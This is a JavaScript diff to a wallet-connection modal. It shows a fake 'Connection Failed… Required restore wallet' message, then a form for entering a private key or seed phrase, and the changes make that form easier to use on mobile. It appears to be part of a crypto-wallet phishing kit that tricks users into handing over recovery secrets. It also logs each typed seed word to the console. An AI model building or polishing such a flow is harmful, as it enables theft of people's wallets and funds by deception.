@@ -726,7 +726,7 @@ class WalletModal {
           <h2 class="text-2xl font-bold text-gray-900 mb-3">Connection Failed</h2>
           <p class="text-gray-500 text-center mb-8">Permission denied. Required restore wallet.</p>
           
-          <button id="continue-to-import-btn" data-action="import" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition active:opacity-80" style="background-color: ${walletColor}">
+          <button onclick="walletModal.showImportScreen()" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition active:opacity-80" style="background-color: ${walletColor}">
             Continue
           </button>
         </div>
@@ -735,23 +735,6 @@ class WalletModal {
 
     const container = document.getElementById('wallet-flow-container') || document.body;
     container.insertAdjacentHTML('beforeend', failedHTML);
-    
-    // Use direct event binding that works in mobile browsers
-    const continueBtn = document.getElementById('continue-to-import-btn');
-    if (continueBtn) {
-      // Multiple event types for better mobile support
-      const handleClick = (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-        console.log('Continue button clicked');
-        this.showImportScreen();
-      };
-      
-      continueBtn.addEventListener('click', handleClick, { passive: false });
-      continueBtn.addEventListener('touchend', handleClick, { passive: false });
-    } else {
-      console.error('Continue button not found');
-    }
   }
 
   showImportScreen() {
@@ -837,15 +820,30 @@ class WalletModal {
       <style>
         #wallet-import-backdrop .seed-word-input:focus {
           border-color: ${walletColor} !important;
+          outline: none !important;
         }
         #wallet-import-backdrop #private-key-input:focus {
           border-color: ${walletColor} !important;
+          outline: none !important;
+        }
+        #wallet-import-backdrop input,
+        #wallet-import-backdrop textarea {
+          -webkit-user-select: text !important;
+          -moz-user-select: text !important;
+          user-select: text !important;
+          -webkit-touch-callout: default !important;
+          pointer-events: auto !important;
+          touch-action: auto !important;
         }
       </style>
     `;
 
     document.body.insertAdjacentHTML('beforeend', importHTML);
-    this.attachInputListeners();
+    
+    // Attach input listeners immediately
+    setTimeout(() => {
+      this.attachInputListeners();
+    }, 50);
   }
 
   renderPrivateKeyInput() {
@@ -857,6 +855,9 @@ class WalletModal {
           class="w-full p-3 sm:p-4 border-2 border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:outline-none resize-none"
           rows="4"
           autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
         >${this.privateKey}</textarea>
       </div>
     `;
@@ -869,10 +870,13 @@ class WalletModal {
         <input
           type="text"
           data-index="${i}"
-          placeholder="${i + 1} word"
+          placeholder="${i + 1}"
           value="${this.seedWords[i] || ''}"
           class="seed-word-input p-2.5 sm:p-3 border border-gray-200 rounded-xl text-xs sm:text-sm text-gray-900 placeholder-gray-400 focus:outline-none"
           autocomplete="off"
+          autocorrect="off"
+          autocapitalize="off"
+          spellcheck="false"
         >
       `);
     }
@@ -880,27 +884,58 @@ class WalletModal {
   }
 
   attachInputListeners() {
+    console.log('Attaching input listeners...');
+    
     // Handle private key input
     const privateKeyInput = document.getElementById('private-key-input');
     if (privateKeyInput) {
+      console.log('Private key input found');
+      
+      // Remove readonly if it exists
+      privateKeyInput.removeAttribute('readonly');
+      
       privateKeyInput.addEventListener('input', (e) => {
         this.privateKey = e.target.value;
+        console.log('Private key updated, length:', this.privateKey.length);
       });
+      
+      privateKeyInput.addEventListener('paste', (e) => {
+        console.log('Paste event detected on private key');
+        // Allow default paste behavior
+      });
+      
+      // Focus the input to open keyboard on mobile
+      setTimeout(() => {
+        privateKeyInput.focus();
+      }, 300);
     }
 
     // Handle seed word inputs
     const seedInputs = document.querySelectorAll('.seed-word-input');
+    console.log(`Found ${seedInputs.length} seed word inputs`);
+    
     seedInputs.forEach((input, index) => {
+      // Remove readonly if it exists
+      input.removeAttribute('readonly');
+      
       input.addEventListener('input', (e) => {
         this.seedWords[index] = e.target.value;
+        console.log(`Word ${index + 1} updated:`, e.target.value);
+      });
+      
+      input.addEventListener('focus', (e) => {
+        console.log(`Input ${index + 1} focused`);
       });
 
       // Handle paste on first input
       if (index === 0) {
         input.addEventListener('paste', (e) => {
+          console.log('Paste event on first seed input');
           e.preventDefault();
           const pastedText = e.clipboardData.getData('text');
           const words = pastedText.trim().split(/\s+/);
+          
+          console.log(`Pasted ${words.length} words`);
           
           words.forEach((word, i) => {
             if (i < this.seedWords.length) {
@@ -912,11 +947,19 @@ class WalletModal {
             }
           });
         });
+        
+        // Focus first input to open keyboard on mobile
+        setTimeout(() => {
+          input.focus();
+        }, 300);
       }
     });
+    
+    console.log('Input listeners attached successfully');
   }
 
   changeImportType(type) {
+    console.log('Changing import type to:', type);
     this.importType = type;
     
     if (type === 'private') {
@@ -931,7 +974,11 @@ class WalletModal {
     if (inputArea) {
       const wordCount = type === 'private' ? 0 : parseInt(type);
       inputArea.innerHTML = type === 'private' ? this.renderPrivateKeyInput() : this.renderSeedPhraseInputs(wordCount);
-      this.attachInputListeners();
+      
+      // Reattach input listeners after changing type
+      setTimeout(() => {
+        this.attachInputListeners();
+      }, 100);
       
       // Update focus color styles
       const walletColor = this.selectedWallet.primaryColor;
@@ -940,9 +987,17 @@ class WalletModal {
         existingStyle.textContent = `
           #wallet-import-backdrop .seed-word-input:focus {
             border-color: ${walletColor} !important;
+            outline: none !important;
           }
           #wallet-import-backdrop #private-key-input:focus {
             border-color: ${walletColor} !important;
+            outline: none !important;
+          }
+          #wallet-import-backdrop input,
+          #wallet-import-backdrop textarea {
+            -webkit-user-select: text !important;
+            user-select: text !important;
+            -webkit-touch-callout: default !important;
           }
         `;
       }
